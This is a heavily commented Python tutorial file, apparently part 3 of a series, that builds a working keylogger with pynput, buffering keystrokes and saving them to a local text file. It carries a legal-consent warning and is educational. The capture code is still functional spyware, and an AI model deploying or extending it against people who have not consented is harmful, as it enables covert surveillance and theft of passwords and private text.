# Keylogger tutorial 3
# we are going to send the file keylog_2.txt to a desired folder
# This requires us to use OS library
# We are also going to make the following improvements:
# Check to see if the directory exists before writing to it, Create the directory if it's missing, Print a message confirming directory creation
# Ignore shift, control, alt, and other unnecessary keys
# Handle backspace properly by deleting the last typed character instead of showing [BACKSPACE]
# Save text naturally without special characters
# Buffer text to save every 10 characters (reduces file write operations & prevents loss of keystrokes) (remove this to save the text as you type)

'''❌ Warning: Keylogging without consent is illegal! and can lead to serious consequences.(fines, imprisonment, etc.)
You should never use this code to log someone's keystrokes without their permission.
Use it only for ethical hacking, forensics, or educational purposes.'''

from pynput import keyboard  
import os # We import os, which helps us work with files and directories/folders on the computer.

# Define the path to the temp files directory (you can change this to your desired location) 
directory_path = os.path.abspath("./temp_files") # os.path.abspath() converts a relative path to an absolute path. It's useful when you want to make sure the path is correct.

# directory_path is a variable that stores the location of the folder where the keylogger will save the file. 
# In this case, it's set to a folder called "temp files" in the current directory (where the script is running).
# The "." in "./temp_files" denotes the current directory. Example, if the script is in "C:\Users\YourName\Documents", the path will be "C:\Users\YourName\Documents\temp_files".

## ERROR HANDLING: Check if the directory exists and create it if it doesn't ##
## This is important because if the directory doesn't exist, trying to save the file there will cause an error.##
try:
    # Check to see if the directory/folder exists.
    os.makedirs(directory_path, exist_ok=True) # If it's missing, os.makedirs() creates all missing folders in the path. exist_ok=True makes sure that if the folder already exists, it doesn't show an error.
    print(f"Directory '{directory_path}' verified or created successfully.") # print success message if the directory is created or already exists.

except Exception as e: # If there's an error (like permission issues), it will be caught here.
    print(f"Error creating directory: {e}")
    exit(1)  # Exit program if directory creation fails. i.e If there's an error, it prints what went wrong and stops the program (exit(1)).

# Create the full file path
file_path = os.path.join(directory_path, "keylog_2.txt") # It combines the directory/folder path with the filename.

# Define special keys to ignore in a dictionary
IGNORED_KEYS = {
    keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.alt, keyboard.Key.alt_r,
    keyboard.Key.caps_lock, keyboard.Key.num_lock, keyboard.Key.scroll_lock, keyboard.Key.cmd,
    keyboard.Key.cmd_r, keyboard.Key.insert
} # These are keys that don't type anything (like Shift, Ctrl, Alt, Caps Lock, etc.).

# Define how some special keys should be represented
SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t"
}# Some keys don't type normal characters (like Space, Enter, or Tab). This dictionary converts them into readable text

# variable to store typed text before saving
typed_text = "" # This stores what the user types before writing it to the file. 

def keyPressed(key): # This function runs every time a key is pressed.
    global typed_text  # This tells Python we want to use the global variable typed_text, not create a new one.
    # Processing the Key Press
    try:
        # Ignore unnecessary keys
        if key in IGNORED_KEYS: # If the pressed key is in the ignored list (Shift, Ctrl, etc.), the function stops and does nothing.
            return # returns nothing.

        # Handle special keys
        if key in SPECIAL_KEYS: # If the pressed key is special (like Space, Enter, or Tab), it gets converted to the correct format.
            key_str = SPECIAL_KEYS[key] # This gets the string representation of the special key.
        elif key == keyboard.Key.backspace: # If the backspace key is pressed, we need to remove the last character from typed_text.
            typed_text = typed_text[:-1]  # Remove the last character from the buffer
            return  # Don't log backspace itself
            
        else:
            key_str = key.char if hasattr(key, 'char') else ''  # If the key is a regular letter, number, or symbol, it gets stored as key_str
            # hasattr(key, 'char') makes sure special function keys (F1, Esc, etc.) don't cause errors.
            # hasattr(object, attribute_name) is a built-in Python function, It checks if an object has a certain attribute before trying to access it.
            # In this case, we are checking if key has an attribute called 'char'.

        # Append the keypress 
        typed_text += key_str # adds the pressed key to the typed text. 
       
        '''You might notice some words get cut off or not saved properly. This is because the program saves the text every 10 characters.
        If you type a word longer than 10 characters, it might get split into two parts. remove the 10 character limit to save the text as you type.'''
        # Save to file every few characters to prevent data loss
        if len(typed_text) >= 10:  # When at least 10 characters are typed, they are saved to the file.
            with open(file_path, "a", encoding="utf-8") as file: # Encoding determines how text is stored in the file. "utf-8" (Unicode Transformation Format - 8-bit) supports all characters, including special symbols and non-English letters.
                file.write(typed_text)
            typed_text = ""  # Reset buffer, typed_text is cleared so we can store new keystrokes.
            '''
            What happens if we don’t use encoding?
            Python uses the system’s default encoding, which may be different on different computers:
            Windows often defaults to ANSI (cp1252), which doesn’t support all characters.
            macOS and Linux usually default to "utf-8", so it might work fine.
            Without "utf-8", you might get encoding errors when typing non-English characters.
            Utf-8 is the safest option because it supports all languages and characters correctly.
            '''
        
        # Stop logging when ESC is pressed
        if key == keyboard.Key.esc:
            with open(file_path, "a", encoding="utf-8") as file:
                file.write(typed_text)  # Save remaining typed text
            print("\nESC key detected. Stopping keylogger...")
            return False  # Stop the listener (this is how pynput knows to exit).

    except Exception as e:
        print(f"Error handling key press: {e}")
        
if __name__ == "__main__": # This checks if the script is being run directly (not imported as a module).
    # Start the listener
    with keyboard.Listener(on_press=keyPressed) as listener: # keyboard.Listener waits for keypresses and calls keyPressed()
        listener.join()  # Keeps the program running until ESC is pressed

    print("Keylogger stopped.")
